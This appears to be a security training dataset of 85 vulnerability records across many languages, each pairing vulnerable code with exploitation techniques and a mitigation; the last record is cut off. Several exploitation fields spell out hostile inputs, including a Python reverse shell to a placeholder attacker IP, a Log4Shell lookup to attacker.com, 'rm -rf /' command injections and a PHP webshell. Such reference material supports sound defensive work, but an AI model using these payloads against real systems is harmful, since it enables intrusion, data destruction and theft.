{
  "id": "vuln-001",
  "language": "Node.js",
  "vulnerability_type": "SQL Injection",
  "description": "Unsanitized user input in SQL queries allows attackers to manipulate database operations.",
  "code_snippet": "const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`; db.query(query, (err, res) => {...});",
  "exploitation_techniques": "Inject malicious SQL like ' OR '1'='1 to bypass authentication. Use tools like SQLMap for automated exploitation.",
  "mitigation": "Use parameterized queries or ORM like Sequelize. Validate and sanitize inputs with libraries like validator.js."
}
{
  "id": "vuln-002",
  "language": "Node.js",
  "vulnerability_type": "Command Injection",
  "description": "Executing shell commands with unsanitized input leads to arbitrary command execution.",
  "code_snippet": "const { exec } = require('child_process'); exec(`ping ${req.query.host}`, (err, stdout) => {...});",
  "exploitation_techniques": "Append commands like ; rm -rf / to input. Exploit via web requests or fuzzing tools like Burp Suite.",
  "mitigation": "Avoid exec; use spawn with array args. Sanitize input and whitelist allowed values."
}
{
  "id": "vuln-003",
  "language": "Python",
  "vulnerability_type": "SQL Injection",
  "description": "Direct string concatenation in SQL queries exposes to injection attacks.",
  "code_snippet": "cursor.execute(f\"SELECT * FROM users WHERE username = '{request.form['username']}' AND password = '{request.form['password']}'\")",
  "exploitation_techniques": "Input payloads like ' OR 1=1-- to extract data. Automate with sqlmap or custom scripts.",
  "mitigation": "Use parameterized queries with psycopg2 or SQLAlchemy. Implement input validation."
}
{
  "id": "vuln-004",
  "language": "Python",
  "vulnerability_type": "OS Command Injection",
  "description": "Subprocess calls with user input enable command chaining.",
  "code_snippet": "import subprocess; subprocess.call(f\"ping {request.args.get('host')}\", shell=True)",
  "exploitation_techniques": "Inject ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker_ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")' for reverse shell.",
  "mitigation": "Use shell=False and list args. Validate input against regex patterns."
}
{
  "id": "vuln-005",
  "language": "Java",
  "vulnerability_type": "SQL Injection",
  "description": "Concatenated SQL strings from user input compromise query integrity.",
  "code_snippet": "String query = \"SELECT * FROM users WHERE username = '\" + request.getParameter(\"username\") + \"' AND password = '\" + request.getParameter(\"password\") + \"'\"; stmt.executeQuery(query);",
  "exploitation_techniques": "Use ' UNION SELECT database()-- to leak info. Chain with JDBC exploits.",
  "mitigation": "Employ PreparedStatement with placeholders. Use OWASP ESAPI for sanitization."
}
{
  "id": "vuln-006",
  "language": "Java",
  "vulnerability_type": "XXE (XML External Entity)",
  "description": "Processing unvalidated XML allows entity expansion or external file access.",
  "code_snippet": "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(new InputSource(new StringReader(xmlInput)));",
  "exploitation_techniques": "Inject <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> and reference &xxe; to read files.",
  "mitigation": "Disable external entities: dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); Use secure parsers like OWASP guidelines."
}
{
  "id": "vuln-007",
  "language": "PHP",
  "vulnerability_type": "SQL Injection",
  "description": "Raw input in MySQL queries enables data manipulation.",
  "code_snippet": "$query = \"SELECT * FROM users WHERE username = '\" . $_POST['username'] . \"' AND password = '\" . $_POST['password'] . \"'\"; mysqli_query($conn, $query);",
  "exploitation_techniques": "Payload: ' OR SLEEP(5)-- for time-based blind injection. Use Havij or manual burp intercepts.",
  "mitigation": "Prepared statements: $stmt = $conn->prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\"); Bind params."
}
{
  "id": "vuln-008",
  "language": "PHP",
  "vulnerability_type": "File Inclusion",
  "description": "User-controlled paths in include/require lead to LFI/RFI.",
  "code_snippet": "include($_GET['page'] . '.php');",
  "exploitation_techniques": "Append ?page=../../../etc/passwd%00 for LFI. For RFI, use remote URLs if allow_url_include=on.",
  "mitigation": "Whitelist allowed files. Use basename() and avoid user input in paths."
}
{
  "id": "vuln-009",
  "language": "Ruby",
  "vulnerability_type": "SQL Injection",
  "description": "Interpolated strings in ActiveRecord queries vulnerable to injection.",
  "code_snippet": "User.where(\"username = '#{params[:username]}' AND password = '#{params[:password]}'\")",
  "exploitation_techniques": "Input: '); DROP TABLE users;-- to destroy data. Exploit via Rails console or web forms.",
  "mitigation": "Use placeholders: User.where(username: params[:username], password: params[:password]). Sanitize with Rails built-ins."
}
{
  "id": "vuln-010",
  "language": "Ruby",
  "vulnerability_type": "Command Injection",
  "description": "System calls with user input allow arbitrary execution.",
  "code_snippet": "system(\"ping #{params[:host]}\")",
  "exploitation_techniques": "Inject ; rm -rf / for destruction. Chain commands for shell access.",
  "mitigation": "Use Open3.capture3 with array: Open3.capture3('ping', params[:host]). Validate host with IP regex."
}
{
  "id": "vuln-011",
  "language": "Go",
  "vulnerability_type": "SQL Injection",
  "description": "Formatted strings in database queries expose to attacks.",
  "code_snippet": "query := fmt.Sprintf(\"SELECT * FROM users WHERE username = '%s' AND password = '%s'\", r.FormValue(\"username\"), r.FormValue(\"password\")); db.Query(query)",
  "exploitation_techniques": "Payload: ' OR '1'='1 to login bypass. Use go-sql-driver exploits.",
  "mitigation": "Prepared statements: stmt, _ := db.Prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\"); stmt.Query(username, password)"
}
{
  "id": "vuln-012",
  "language": "Go",
  "vulnerability_type": "Path Traversal",
  "description": "User input in file paths allows accessing unauthorized files.",
  "code_snippet": "http.HandleFunc(\"/file\", func(w http.ResponseWriter, r *http.Request) { file := r.URL.Query().Get(\"file\"); data, _ := ioutil.ReadFile(file); ... })",
  "exploitation_techniques": "Query ?file=../../../etc/passwd to read sensitive files.",
  "mitigation": "Canonicalize paths: filepath.Clean(file). Restrict to base dir with filepath.Join(base, file)."
}
{
  "id": "vuln-013",
  "language": "C# (.NET)",
  "vulnerability_type": "SQL Injection",
  "description": "Concatenated SQL commands from input.",
  "code_snippet": "string query = \"SELECT * FROM users WHERE username = '\" + Request.Form[\"username\"] + \"' AND password = '\" + Request.Form[\"password\"] + \"'\"; SqlCommand cmd = new SqlCommand(query);",
  "exploitation_techniques": "Input: '; EXEC xp_cmdshell('net user hacker pass /add')-- for command exec.",
  "mitigation": "Parameterized: SqlCommand cmd = new SqlCommand(\"SELECT * FROM users WHERE username = @user AND password = @pass\"); cmd.Parameters.AddWithValue(\"@user\", username);"
}
{
  "id": "vuln-014",
  "language": "C# (.NET)",
  "vulnerability_type": "LDAP Injection",
  "description": "Unsanitized input in LDAP queries.",
  "code_snippet": "string filter = \"(uid=\" + username + \")\"; DirectorySearcher searcher = new DirectorySearcher(filter);",
  "exploitation_techniques": "Input: *)(uid=*))(|(uid=* to bypass filters and enumerate users.",
  "mitigation": "Escape special chars: username = username.Replace(\"(\", \"%28\").Replace(\")\", \"%29\"); Use parameterized LDAP if available."
}
{
  "id": "vuln-015",
  "language": "Node.js",
  "vulnerability_type": "NoSQL Injection",
  "description": "Unsanitized input in MongoDB queries allows query manipulation.",
  "code_snippet": "const query = { username: req.body.username, password: req.body.password }; db.collection('users').findOne(query);",
  "exploitation_techniques": "Input JSON like {\"$ne\": null} for username to bypass checks. Use NoSQLMap for automation.",
  "mitigation": "Use MongoDB's aggregation or sanitize with mongoose schemas. Validate inputs strictly."
}
{
  "id": "vuln-016",
  "language": "Node.js",
  "vulnerability_type": "SSRF",
  "description": "User-controlled URLs in requests lead to internal resource access.",
  "code_snippet": "const url = req.query.url; axios.get(url).then(res => {...});",
  "exploitation_techniques": "Request internal IPs like http://169.254.169.254/latest/meta-data/ for cloud metadata. Chain with DNS rebinding.",
  "mitigation": "Whitelist allowed domains. Use libraries like ssrf-req-filter."
}
{
  "id": "vuln-017",
  "language": "Python",
  "vulnerability_type": "Deserialization",
  "description": "Untrusted data in pickle loads arbitrary code execution.",
  "code_snippet": "import pickle; data = request.data; obj = pickle.loads(data);",
  "exploitation_techniques": "Craft malicious pickle with __reduce__ to exec os.system('rm -rf /'). Use ysoserial equivalents.",
  "mitigation": "Avoid pickle; use JSON or safe serializers like msgpack. Sign data with HMAC."
}
{
  "id": "vuln-018",
  "language": "Python",
  "vulnerability_type": "Path Traversal",
  "description": "User input in file paths exposes sensitive files.",
  "code_snippet": "filename = request.args.get('file'); with open(filename, 'r') as f: ...",
  "exploitation_techniques": "Input ../etc/passwd to read files. Traverse to /proc/self/environ for env vars.",
  "mitigation": "Use os.path.normpath and check against base dir. Whitelist file names."
}
{
  "id": "vuln-019",
  "language": "Java",
  "vulnerability_type": "Deserialization",
  "description": "ObjectInputStream on untrusted data executes gadgets.",
  "code_snippet": "ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); Object obj = ois.readObject();",
  "exploitation_techniques": "Use ysoserial CommonsCollections for RCE. Chain gadgets for command exec.",
  "mitigation": "Use SerialKiller or NotSoSerial lookback. Avoid deserialization of untrusted data."
}
{
  "id": "vuln-020",
  "language": "Java",
  "vulnerability_type": "LDAP Injection",
  "description": "Unsanitized input alters LDAP filters.",
  "code_snippet": "String filter = \"(cn=\" + userInput + \")\"; ldapCtx.search(\"\", filter, controls);",
  "exploitation_techniques": "Input *)(|(objectClass=*) to enumerate. Bypass auth with )(uid=*.",
  "mitigation": "Escape LDAP chars: replace * with \\2a, ( with \\28. Use prepared LDAP statements if available."
}
{
  "id": "vuln-021",
  "language": "PHP",
  "vulnerability_type": "XXE",
  "description": "XML processing without disabling entities.",
  "code_snippet": "$xml = simplexml_load_string($input);",
  "exploitation_techniques": "Inject <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> &xxe; for file read.",
  "mitigation": "libxml_disable_entity_loader(true); Use DOMDocument with setFeature."
}
{
  "id": "vuln-022",
  "language": "PHP",
  "vulnerability_type": "Unrestricted File Upload",
  "description": "No validation on uploaded files allows webshells.",
  "code_snippet": "move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",
  "exploitation_techniques": "Upload .php with <?php system($_GET['cmd']); ?> and access for RCE.",
  "mitigation": "Check MIME types, extensions. Store outside webroot, generate random names."
}
{
  "id": "vuln-023",
  "language": "Ruby",
  "vulnerability_type": "Deserialization",
  "description": "Marshal.load on untrusted data executes code.",
  "code_snippet": "obj = Marshal.load(input);",
  "exploitation_techniques": "Craft payload with _dump to exec system calls. Use Ruby equivalents of ysoserial.",
  "mitigation": "Use JSON or YAML.safe_load. Sign data with secrets."
}
{
  "id": "vuln-024",
  "language": "Ruby",
  "vulnerability_type": "SSRF",
  "description": "OpenURI with user URLs accesses internals.",
  "code_snippet": "require 'open-uri'; URI.open(params[:url]).read;",
  "exploitation_techniques": "file:///etc/passwd or http://127.0.0.1/admin for local access.",
  "mitigation": "Use Net::HTTP with domain whitelisting. Avoid file:// scheme."
}
{
  "id": "vuln-025",
  "language": "Go",
  "vulnerability_type": "Deserialization",
  "description": "Gob decoding untrusted data, though less common, can lead to issues.",
  "code_snippet": "dec := gob.NewDecoder(bytes.NewReader(data)); var obj MyType; dec.Decode(&obj);",
  "exploitation_techniques": "Exploit type mismatches or large allocations for DoS. Limited RCE.",
  "mitigation": "Use JSON or protobuf. Validate and limit input size."
}
{
  "id": "vuln-026",
  "language": "Go",
  "vulnerability_type": "SSRF",
  "description": "http.Get with user input URLs.",
  "code_snippet": "resp, _ := http.Get(r.URL.Query().Get(\"url\"));",
  "exploitation_techniques": "http://localhost:8080/secret or gopher:// for protocol abuse.",
  "mitigation": "Custom transport with URL parsing and domain whitelist."
}
{
  "id": "vuln-027",
  "language": "C# (.NET)",
  "vulnerability_type": "Deserialization",
  "description": "BinaryFormatter on untrusted data executes gadgets.",
  "code_snippet": "BinaryFormatter bf = new BinaryFormatter(); object obj = bf.Deserialize(stream);",
  "exploitation_techniques": "Ysoserial.Net payloads like TextFormattingRunProperties for RCE.",
  "mitigation": "Avoid BinaryFormatter; use Json.NET with TypeNameHandling.None."
}
{
  "id": "vuln-028",
  "language": "C# (.NET)",
  "vulnerability_type": "XXE",
  "description": "XmlReader without secure settings.",
  "code_snippet": "XmlReader reader = XmlReader.Create(new StringReader(xml));",
  "exploitation_techniques": "XXE payload for file:/C:/Windows/win.ini read.",
  "mitigation": "XmlReaderSettings settings = new XmlReaderSettings() { DtdProcessing = DtdProcessing.Prohibit };"
}
{
  "id": "vuln-029",
  "language": "Node.js",
  "vulnerability_type": "Prototype Pollution",
  "description": "Merging untrusted objects pollutes prototypes.",
  "code_snippet": "function merge(target, source) { for (let key in source) { target[key] = source[key]; } } merge({}, req.body);",
  "exploitation_techniques": "Input {\"__proto__\": {\"admin\": true}} to alter behavior.",
  "mitigation": "Use Object.create(null) or libraries like lodash merge with checks."
}
{
  "id": "vuln-030",
  "language": "Node.js",
  "vulnerability_type": "JWT None Algorithm",
  "description": "Accepting 'none' algorithm in JWT validation.",
  "code_snippet": "jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });",
  "exploitation_techniques": "Change alg to none and remove signature for bypass.",
  "mitigation": "Specify algorithms: ['HS256']. Use jsonwebtoken with strict options."
}
{
  "id": "vuln-031",
  "language": "Python",
  "vulnerability_type": "SSRF",
  "description": "requests.get with user URLs.",
  "code_snippet": "import requests; requests.get(request.args.get('url'))",
  "exploitation_techniques": "dict://localhost:6379/info for port scanning.",
  "mitigation": "Use defuse/ssrf-filters or whitelist URLs."
}
{
  "id": "vuln-032",
  "language": "Python",
  "vulnerability_type": "Template Injection",
  "description": "Jinja2 with user input in templates.",
  "code_snippet": "from jinja2 import Template; Template(user_input).render();",
  "exploitation_techniques": "{{ config.items() }} for config dump. Escalate to RCE with __globals__.",
  "mitigation": "Sandbox environment or avoid rendering user templates."
}
{
  "id": "vuln-033",
  "language": "Java",
  "vulnerability_type": "SSRF",
  "description": "URL connections with user input.",
  "code_snippet": "URL url = new URL(request.getParameter(\"url\")); url.openConnection();",
  "exploitation_techniques": "jar:file:///etc/passwd!/ for file read.",
  "mitigation": "Validate scheme and host. Use Apache HttpClient with restrictions."
}
{
  "id": "vuln-034",
  "language": "Java",
  "vulnerability_type": "Log4Shell",
  "description": "Log4j vulnerable to JNDI injection.",
  "code_snippet": "logger.error(userInput); // with log4j < 2.15",
  "exploitation_techniques": "${jndi:ldap://attacker.com/a} for RCE.",
  "mitigation": "Upgrade to log4j 2.17+. Set log4j2.formatMsgNoLookups=true."
}
{
  "id": "vuln-035",
  "language": "PHP",
  "vulnerability_type": "Deserialization",
  "description": "unserialize on user data.",
  "code_snippet": "unserialize($_COOKIE['data']);",
  "exploitation_techniques": "PHPGGC payloads for __destruct RCE.",
  "mitigation": "Use json_decode. If needed, allowed_classes option."
}
{
  "id": "vuln-036",
  "language": "PHP",
  "vulnerability_type": "SSRF",
  "description": "curl_exec with user URLs.",
  "code_snippet": "$ch = curl_init($_GET['url']); curl_exec($ch);",
  "exploitation_techniques": "gopher://127.0.0.1:6379/_%0d%0aSET%20key%20val for Redis attack.",
  "mitigation": "curl_setopt(CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);"
}
{
  "id": "vuln-037",
  "language": "Ruby",
  "vulnerability_type": "YAML Deserialization",
  "description": "YAML.load on untrusted input.",
  "code_snippet": "YAML.load(input);",
  "exploitation_techniques": "!ruby/object:Gem::Installer { :i: !ruby/object:Gem::SpecFetcher { :f: !ruby/object:Gem::Installer { :i: !ruby/object:Gem::Requirement { requirements: !ruby/object:Gem::Package::TarReader { io: !ruby/object:Net::BufferedIO { io: !ruby/object:Gem::Package::TarReader::Entry { read: 0, header: \"foo\" } } } } } } for RCE.",
  "mitigation": "YAML.safe_load with permitted_classes."
}
{
  "id": "vuln-038",
  "language": "Ruby",
  "vulnerability_type": "Path Traversal",
  "description": "File.open with user paths.",
  "code_snippet": "File.open(params[:file]).read",
  "exploitation_techniques": "../../etc/passwd",
  "mitigation": "File.expand_path(file, base_dir) and check prefix."
}
{
  "id": "vuln-039",
  "language": "Go",
  "vulnerability_type": "Template Injection",
  "description": "html/template with user input as template.",
  "code_snippet": "t, _ := template.New(\"\").Parse(userInput); t.Execute(w, data);",
  "exploitation_techniques": "{{ .OS }} or range to access env.",
  "mitigation": "Don't parse user input as templates. Use static templates."
}
{
  "id": "vuln-040",
  "language": "Go",
  "vulnerability_type": "Insecure Randomness",
  "description": "math/rand for crypto purposes.",
  "code_snippet": "import \"math/rand\"; token := rand.Intn(1000000);",
  "exploitation_techniques": "Predict seeds based on time for token guessing.",
  "mitigation": "Use crypto/rand.Reader."
}
{
  "id": "vuln-041",
  "language": "C# (.NET)",
  "vulnerability_type": "SSRF",
  "description": "WebClient.DownloadString with user URLs.",
  "code_snippet": "new WebClient().DownloadString(Request.QueryString[\"url\"]);",
  "exploitation_techniques": "file:///C:/inetpub/wwwroot/web.config",
  "mitigation": "Uri uri = new Uri(url); if (uri.Scheme != \"http\" && uri.Scheme != \"https\") throw;"
}
{
  "id": "vuln-042",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Deserialization (JSON)",
  "description": "JavaScriptSerializer with TypeResolver.",
  "code_snippet": "new JavaScriptSerializer(new SimpleTypeResolver()).Deserialize<object>(input);",
  "exploitation_techniques": "Payloads for ProcessStartInfo RCE.",
  "mitigation": "Use Json.NET with TypeNameHandling.None."
}
{
  "id": "vuln-043",
  "language": "Kotlin",
  "vulnerability_type": "SQL Injection",
  "description": "String interpolation in queries.",
  "code_snippet": "val query = \"SELECT * FROM users WHERE name = '${request.params[\"name\"]}'\"; db.rawQuery(query)",
  "exploitation_techniques": "' OR 1=1--",
  "mitigation": "Use PreparedStatement."
}
{
  "id": "vuln-044",
  "language": "Kotlin",
  "vulnerability_type": "Deserialization",
  "description": "ObjectInputStream in Kotlin.",
  "code_snippet": "val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject()",
  "exploitation_techniques": "Similar to Java ysoserial.",
  "mitigation": "Avoid, use Kotlinx.serialization."
}
{
  "id": "vuln-045",
  "language": "Scala",
  "vulnerability_type": "Command Injection",
  "description": "Process execution with input.",
  "code_snippet": "import sys.process._; s\"ping $host\".!",
  "exploitation_techniques": "; rm -rf /",
  "mitigation": "Seq(\"ping\", host).!"
}
{
  "id": "vuln-046",
  "language": "Scala",
  "vulnerability_type": "XXE",
  "description": "XML parsing without security.",
  "code_snippet": "XML.loadString(xml)",
  "exploitation_techniques": "Standard XXE payloads.",
  "mitigation": "Use SAXParser with features disabled."
}
{
  "id": "vuln-047",
  "language": "Rust",
  "vulnerability_type": "Command Injection",
  "description": "Command::new with unsanitized input.",
  "code_snippet": "use std::process::Command; Command::new(\"sh\").arg(\"-c\").arg(&input).output();",
  "exploitation_techniques": "ls; rm -rf /",
  "mitigation": "Avoid shell; use separate args."
}
{
  "id": "vuln-048",
  "language": "Rust",
  "vulnerability_type": "Path Traversal",
  "description": "Path::new with user input.",
  "code_snippet": "let path = Path::new(&input); fs::read_to_string(path);",
  "exploitation_techniques": "../../../etc/passwd",
  "mitigation": "Canonicalize and check components."
}
{
  "id": "vuln-049",
  "language": "Elixir",
  "vulnerability_type": "SQL Injection",
  "description": "Raw SQL with interpolation.",
  "code_snippet": "Repo.query(\"SELECT * FROM users WHERE name = '#{name}'\")",
  "exploitation_techniques": "' OR 1=1",
  "mitigation": "Use Ecto.Query with params."
}
{
  "id": "vuln-050",
  "language": "Elixir",
  "vulnerability_type": "Command Injection",
  "description": "System.cmd with input.",
  "code_snippet": "System.cmd(\"ping\", [host])",
  "exploitation_techniques": "If shell: ping; rm",
  "mitigation": "Use Porcelain without shell."
}
{
  "id": "vuln-051",
  "language": "Perl",
  "vulnerability_type": "SQL Injection",
  "description": "DBI with concatenated queries.",
  "code_snippet": "$dbh->do(\"SELECT * FROM users WHERE name = '$name'\");",
  "exploitation_techniques": "' OR 1=1--",
  "mitigation": "Use placeholders: $dbh->prepare(\"SELECT * FROM users WHERE name = ?\");"
}
{
  "id": "vuln-052",
  "language": "Perl",
  "vulnerability_type": "Command Injection",
  "description": "system with input.",
  "code_snippet": "system(\"ping $host\");",
  "exploitation_techniques": "; rm -rf /",
  "mitigation": "system('ping', $host);"
}
{
  "id": "vuln-053",
  "language": "Node.js",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Evil regex leading to ReDoS.",
  "code_snippet": "/^([a-zA-Z0-9]+)*$/.test(input);",
  "exploitation_techniques": "Input aaaaaaaaaaaaaaaaaaaaaaaaa! for backtracking.",
  "mitigation": "Use safe-regex or atomic groups."
}
{
  "id": "vuln-054",
  "language": "Python",
  "vulnerability_type": "Insecure Eval",
  "description": "eval on user input.",
  "code_snippet": "eval(request.args.get('expr'))",
  "exploitation_techniques": "__import__('os').system('rm -rf /')",
  "mitigation": "Avoid eval; use ast.literal_eval for safe cases."
}
{
  "id": "vuln-055",
  "language": "Java",
  "vulnerability_type": "Insecure Random",
  "description": "java.util.Random for crypto.",
  "code_snippet": "Random rand = new Random(); int token = rand.nextInt();",
  "exploitation_techniques": "Predict based on seed.",
  "mitigation": "SecureRandom sr = new SecureRandom();"
}
{
  "id": "vuln-056",
  "language": "PHP",
  "vulnerability_type": "Insecure Eval",
  "description": "eval on input.",
  "code_snippet": "eval($_GET['code']);",
  "exploitation_techniques": "system('rm -rf /');",
  "mitigation": "Never use eval."
}
{
  "id": "vuln-057",
  "language": "Ruby",
  "vulnerability_type": "Insecure Eval",
  "description": "eval on params.",
  "code_snippet": "eval(params[:code])",
  "exploitation_techniques": "system('rm -rf /')",
  "mitigation": "Avoid eval; use safer alternatives."
}
{
  "id": "vuln-058",
  "language": "Go",
  "vulnerability_type": "Race Condition",
  "description": "File creation without checks.",
  "code_snippet": "if _, err := os.Stat(file); os.IsNotExist(err) { os.Create(file); }",
  "exploitation_techniques": "TOCTOU: symlink during check and create.",
  "mitigation": "Use os.OpenFile with O_EXCL | O_CREATE."
}
{
  "id": "vuln-059",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Random",
  "description": "System.Random for secrets.",
  "code_snippet": "Random rand = new Random(); int token = rand.Next();",
  "exploitation_techniques": "Predictable sequences.",
  "mitigation": "RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();"
}
{
  "id": "vuln-060",
  "language": "Node.js",
  "vulnerability_type": "CORS Misconfiguration",
  "description": "Allowing all origins.",
  "code_snippet": "app.use(cors({ origin: '*' }));",
  "exploitation_techniques": "CSRF from malicious sites.",
  "mitigation": "Specify origins: { origin: 'trusted.com' }"
}
{
  "id": "vuln-061",
  "language": "Python",
  "vulnerability_type": "CORS Misconfig",
  "description": "Flask-CORS with *.",
  "code_snippet": "CORS(app, resources={r\"/*\": {\"origins\": \"*\"}})",
  "exploitation_techniques": "Cross-origin requests.",
  "mitigation": "Specify origins."
}
{
  "id": "vuln-062",
  "language": "Java",
  "vulnerability_type": "IDOR",
  "description": "Direct object reference without authz.",
  "code_snippet": "User user = em.find(User.class, request.getParameter(\"id\"));",
  "exploitation_techniques": "Change id to access others' data.",
  "mitigation": "Check ownership: if (user.getId() != sessionUserId) deny;"
}
{
  "id": "vuln-063",
  "language": "PHP",
  "vulnerability_type": "IDOR",
  "description": "Fetching by user-supplied ID.",
  "code_snippet": "$id = $_GET['id']; $user = $db->query(\"SELECT * FROM users WHERE id = $id\");",
  "exploitation_techniques": "Increment IDs to leak.",
  "mitigation": "Verify session user owns the ID."
}
{
  "id": "vuln-064",
  "language": "Ruby",
  "vulnerability_type": "Mass Assignment",
  "description": "params.permit without whitelist.",
  "code_snippet": "User.create(params[:user])",
  "exploitation_techniques": "Add admin: true in params.",
  "mitigation": "User.create(params.require(:user).permit(:name, :email))"
}
{
  "id": "vuln-065",
  "language": "Go",
  "vulnerability_type": "IDOR",
  "description": "Direct access by ID.",
  "code_snippet": "id := r.URL.Query().Get(\"id\"); db.GetUser(id);",
  "exploitation_techniques": "Guess IDs.",
  "mitigation": "Check against session user."
}
{
  "id": "vuln-066",
  "language": "C# (.NET)",
  "vulnerability_type": "IDOR",
  "description": "Entity by ID without check.",
  "code_snippet": "var user = db.Users.Find(Request.Query[\"id\"]);",
  "exploitation_techniques": "Modify ID.",
  "mitigation": "if (user.Id != User.Identity.GetUserId()) deny;"
}
{
  "id": "vuln-067",
  "language": "Kotlin",
  "vulnerability_type": "SSRF",
  "description": "OkHttp with user URL.",
  "code_snippet": "val client = OkHttpClient(); client.newCall(Request.Builder().url(url).build()).execute();",
  "exploitation_techniques": "Internal URLs.",
  "mitigation": "Validate URL host."
}
{
  "id": "vuln-068",
  "language": "Scala",
  "vulnerability_type": "Deserialization",
  "description": "Java deserialization in Scala.",
  "code_snippet": "Similar to Java ObjectInputStream.",
  "exploitation_techniques": "Ysoserial.",
  "mitigation": "Avoid; use Scala pickling with care."
}
{
  "id": "vuln-069",
  "language": "Rust",
  "vulnerability_type": "SQL Injection",
  "description": "rusqlite with concat.",
  "code_snippet": "conn.execute(&format!(\"SELECT * FROM users WHERE name = '{name}'\"), []);",
  "exploitation_techniques": "' OR 1=1",
  "mitigation": "Use params: conn.execute(\"SELECT * FROM users WHERE name = ?1\", [name]);"
}
{
  "id": "vuln-070",
  "language": "Elixir",
  "vulnerability_type": "Deserialization",
  "description": "Erlang term_to_binary inverse.",
  "code_snippet": ":erlang.binary_to_term(input)",
  "exploitation_techniques": "Craft terms for code exec.",
  "mitigation": "Use :safe option or avoid."
}
{
  "id": "vuln-071",
  "language": "Perl",
  "vulnerability_type": "XXE",
  "description": "XML::Simple without NoExpand.",
  "code_snippet": "XMLin($xml);",
  "exploitation_techniques": "XXE payload.",
  "mitigation": "XMLin($xml, NoExpand => 1, NSExpand => 1);"
}
{
  "id": "vuln-072",
  "language": "Node.js",
  "vulnerability_type": "Zip Slip",
  "description": "Extracting zip without path checks.",
  "code_snippet": "adm-zip extracts to paths with ../",
  "exploitation_techniques": "Zip with ../files to overwrite.",
  "mitigation": "Sanitize paths, strip ../"
}
{
  "id": "vuln-073",
  "language": "Python",
  "vulnerability_type": "Zip Slip",
  "description": "zipfile.extractall without validation.",
  "code_snippet": "with zipfile.ZipFile(file) as z: z.extractall();",
  "exploitation_techniques": "Malicious zip with ../",
  "mitigation": "Check member.filename for ../"
}
{
  "id": "vuln-074",
  "language": "Java",
  "vulnerability_type": "Zip Slip",
  "description": "ZipInputStream without path sanitization.",
  "code_snippet": "Extract to entry.getName()",
  "exploitation_techniques": "../ in entry name.",
  "mitigation": "Canonicalize and check path."
}
{
  "id": "vuln-075",
  "language": "PHP",
  "vulnerability_type": "Zip Slip",
  "description": "ZipArchive::extractTo",
  "code_snippet": "$zip->extractTo('/path/');",
  "exploitation_techniques": "../ in filenames.",
  "mitigation": "Validate each filename."
}
{
  "id": "vuln-076",
  "language": "Ruby",
  "vulnerability_type": "Zip Slip",
  "description": "rubyzip extract.",
  "code_snippet": "Zip::File.open(file) { |z| z.each { |e| e.extract } }",
  "exploitation_techniques": "../ paths.",
  "mitigation": "Check e.name for ../"
}
{
  "id": "vuln-077",
  "language": "Go",
  "vulnerability_type": "Zip Slip",
  "description": "archive/zip Reader.",
  "code_snippet": "r, _ := zip.OpenReader(file); for _, f := range r.File { os.Create(f.Name) }",
  "exploitation_techniques": "../ in f.Name",
  "mitigation": "Clean path with filepath.Clean"
}
{
  "id": "vuln-078",
  "language": "C# (.NET)",
  "vulnerability_type": "Zip Slip",
  "description": "ZipArchive ExtractToDirectory",
  "code_snippet": "ZipFile.ExtractToDirectory(zipPath, extractPath);",
  "exploitation_techniques": "../ entries.",
  "mitigation": "Manual extract with path validation."
}
{
  "id": "vuln-079",
  "language": "Node.js",
  "vulnerability_type": "GraphQL Depth Limit",
  "description": "No depth limit on queries.",
  "code_snippet": "apollo-server without depthLimit",
  "exploitation_techniques": "Nested queries for DoS.",
  "mitigation": "Use graphql-depth-limit."
}
{
  "id": "vuln-080",
  "language": "Python",
  "vulnerability_type": "GraphQL Injection",
  "description": "Unsanitized inputs in resolvers.",
  "code_snippet": "graphql with raw SQL in resolver.",
  "exploitation_techniques": "Injection in variables.",
  "mitigation": "Parameterize queries in resolvers."
}
{
  "id": "vuln-081",
  "language": "Java",
  "vulnerability_type": "Insecure Session Handling",
  "description": "Session IDs exposed in URLs or predictable.",
  "code_snippet": "String sessionId = UUID.randomUUID().toString(); response.sendRedirect(\"page?sessionId=\" + sessionId);",
  "exploitation_techniques": "Sniff URLs for session IDs or brute-force predictable IDs.",
  "mitigation": "Use HttpSession with secure cookies: session.setAttribute(\"user\", user); Set Secure, HttpOnly flags."
}
{
  "id": "vuln-082",
  "language": "Java",
  "vulnerability_type": "Broken Authentication",
  "description": "Weak password storage without hashing.",
  "code_snippet": "String password = request.getParameter(\"password\"); em.persist(new User(username, password));",
  "exploitation_techniques": "Dump database to access plaintext passwords.",
  "mitigation": "Use BCrypt: String hashed = BCrypt.hashpw(password, BCrypt.gensalt());"
}
{
  "id": "vuln-083",
  "language": "PHP",
  "vulnerability_type": "Session Fixation",
  "description": "Not regenerating session ID on login.",
  "code_snippet": "session_start(); $_SESSION['user'] = $username;",
  "exploitation_techniques": "Provide malicious session ID via URL, hijack post-login.",
  "mitigation": "Regenerate: session_regenerate_id(true);"
}
{
  "id": "vuln-084",
  "language": "PHP",
  "vulnerability_type": "Insecure Direct Object Reference",
  "description": "Accessing resources by predictable IDs.",
  "code_snippet": "$id = $_GET['id']; $file = file_get_contents(\"files/$id.pdf\");",
  "exploitation_techniques": "Guess IDs to access unauthorized files.",
  "mitigation": "Check permissions: if (!userCanAccess($id, $user)) exit;"
}
{
  "id": "vuln-085",
  "language": "Python",
  "vulnerability_type": "Insecure Session Cookies",
  "description": "Cookies without Secure/HttpOnly flags.",
